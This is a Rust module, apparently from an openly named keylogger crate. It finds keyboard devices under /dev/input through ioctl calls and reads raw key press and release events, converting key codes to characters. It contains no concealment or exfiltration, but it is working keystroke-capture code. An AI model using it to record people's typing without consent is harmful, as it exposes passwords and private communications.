use crate::error::KeyloggerError;
use crate::keylogger::KeyloggerResult;
use crate::keys::key_code_to_char;
use futures::ready;
use std::convert::TryFrom;
use std::fs::{self, File};
use std::future::Future;
use std::io;
use std::os::fd::{AsRawFd, RawFd};
use std::os::unix::fs::FileTypeExt;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context, Poll};
use tokio::io::unix::AsyncFd;

const _IOC_NRBITS: libc::c_ulong = 8;
const _IOC_TYPEBITS: libc::c_ulong = 8;
const _IOC_SIZEBITS: libc::c_ulong = 14;
const _IOC_NRSHIFT: libc::c_ulong = 0;
const _IOC_TYPESHIFT: libc::c_ulong = _IOC_NRSHIFT + _IOC_NRBITS;
const _IOC_SIZESHIFT: libc::c_ulong = _IOC_TYPESHIFT + _IOC_TYPEBITS;
const _IOC_DIRSHIFT: libc::c_ulong = _IOC_SIZESHIFT + _IOC_SIZEBITS;
const _IOC_READ: libc::c_ulong = 2;

// Interesting Event types (see `input-event-codes.h`)
const EV_SYN: libc::c_ulong = 1;
const EV_KEY: libc::c_ulong = 1 << 1;
const EV_MSC: libc::c_ulong = 1 << 4;
const EV_REP: libc::c_ulong = 1 << 20;

#[derive(Debug)]
pub(crate) struct Keyboard {
    pub(crate) name: String,
    pub(crate) device: PathBuf,
    pub(crate) async_fd: AsyncFd<File>,
}

impl TryFrom<PathBuf> for Keyboard {
    type Error = KeyloggerError;

    fn try_from(device: PathBuf) -> Result<Self, Self::Error> {
        let file = File::open(&device)?;
        let flags = read_event_flags(&file)?;

        if !has_keyboard_flags(flags) {
            return Err(io::Error::new(io::ErrorKind::Other, "not a keyboard device").into());
        }

        let res = unsafe { libc::fcntl(file.as_raw_fd(), libc::F_SETFL, libc::O_NONBLOCK) };

        if res < 0 {
            return Err(io::Error::last_os_error().into());
        }

        let name = read_device_name(&file).unwrap();

        Ok(Keyboard {
            name,
            device,
            async_fd: AsyncFd::new(file)?,
        })
    }
}

impl Keyboard {
    pub(crate) fn read_key_event(self: &Arc<Self>) -> KeyEventFuture {
        KeyEventFuture(Arc::clone(self))
    }
}

pub(crate) struct KeyEventFuture(Arc<Keyboard>);

#[derive(Debug, PartialEq)]
pub struct KeyEvent {
    pub ty: KeyEventType,
    pub code: u16,
    pub chr: Option<char>,
}

#[derive(Debug, PartialEq)]
pub enum KeyEventType {
    Press,
    Release,
}

impl TryFrom<&libc::input_event> for KeyEvent {
    type Error = KeyloggerError;

    fn try_from(ev: &libc::input_event) -> Result<Self, Self::Error> {
        // The keylogger only supports EV_KEY
        if ev.type_ != 1 {
            return Err(KeyloggerError::UnsupportedEventType(ev.type_));
        }

        let ty = match ev.value {
            0 => KeyEventType::Release,
            1 => KeyEventType::Press,
            n => {
                return Err(KeyloggerError::InvalidEvent(format!(
                    "invalid value for EV_KEY: {n}"
                )))
            }
        };

        Ok(Self {
            ty,
            code: ev.code,
            chr: key_code_to_char(ev.code).ok(),
        })
    }
}

impl Future for KeyEventFuture {
    type Output = KeyloggerResult<Vec<KeyEvent>>;

    fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {
        loop {
            let mut guard = ready!(self.0.async_fd.poll_read_ready(cx))?;

            match guard.try_io(|inner| read_key_event(inner.as_raw_fd())) {
                Ok(result) => return Poll::Ready(result.map_err(Into::into)),
                Err(_) => continue,
            }
        }
    }
}

fn read_key_event(fd: RawFd) -> io::Result<Vec<KeyEvent>> {
    const MAX_INPUT_EV: usize = 128;

    let default_event = libc::input_event {
        time: libc::timeval {
            tv_sec: 0,
            tv_usec: 0,
        },
        type_: 0,
        code: 0,
        value: 0,
    };
    let mut input_events = [default_event; MAX_INPUT_EV];

    let n = unsafe { libc::read(fd, input_events.as_mut_ptr() as *mut _, MAX_INPUT_EV) };

    if n < 0 {
        return Err(io::Error::last_os_error());
    }

    let n = (n as usize) / std::mem::size_of::<libc::input_event>();
    Ok(input_events[..n]
        .iter()
        .filter_map(|e| KeyEvent::try_from(e).ok())
        .collect())
}

pub(crate) fn find_keyboard_devices() -> KeyloggerResult<impl Iterator<Item = Keyboard>> {
    Ok(find_char_devices()?.filter_map(|entry| Keyboard::try_from(entry).ok()))
}

fn find_char_devices() -> KeyloggerResult<impl Iterator<Item = PathBuf>> {
    const INPUT_DIR: &str = "/dev/input";

    Ok(fs::read_dir(INPUT_DIR)?.filter_map(|entry| {
        let entry = entry.ok()?;
        let file_type = fs::metadata(entry.path()).ok()?.file_type();

        if file_type.is_char_device() {
            Some(entry.path())
        } else {
            None
        }
    }))
}

fn read_device_name(f: &File) -> KeyloggerResult<String> {
    const DEVICE_NAME_MAX_LEN: usize = 512;

    let mut device_name = [0u8; DEVICE_NAME_MAX_LEN];

    let eviocgname = (_IOC_READ << _IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
        | (0x06 << _IOC_NRSHIFT)
        | ((device_name.len() as libc::c_ulong) << _IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgname,
        device_name.as_mut_ptr() as *mut libc::c_ulong,
    )?;

    Ok(String::from_utf8_lossy(&device_name).into())
}

fn read_event_flags(f: &File) -> KeyloggerResult<libc::c_ulong> {
    let mut ev_flags: libc::c_ulong = 0;

    let eviocgbit = (_IOC_READ << _IOC_DIRSHIFT)
        | (('E' as libc::c_ulong) << _IOC_TYPESHIFT)
        | (0x20 << _IOC_NRSHIFT)
        | (((std::mem::size_of::<libc::c_ulong>()) as libc::c_ulong) << _IOC_SIZESHIFT);

    ioctl(
        f.as_raw_fd(),
        eviocgbit,
        (&mut ev_flags) as *mut libc::c_ulong,
    )?;

    Ok(ev_flags)
}

fn ioctl(fd: RawFd, request: libc::c_ulong, buf: *mut libc::c_ulong) -> KeyloggerResult<()> {
    let res = unsafe { libc::ioctl(fd, request, buf) };

    if res < 0 {
        Err(io::Error::last_os_error().into())
    } else {
        Ok(())
    }
}

fn has_keyboard_flags(flags: libc::c_ulong) -> bool {
    const KEYBOARD_FLAGS: libc::c_ulong = EV_SYN | EV_KEY | EV_MSC | EV_REP;

    (flags & KEYBOARD_FLAGS) == KEYBOARD_FLAGS
}
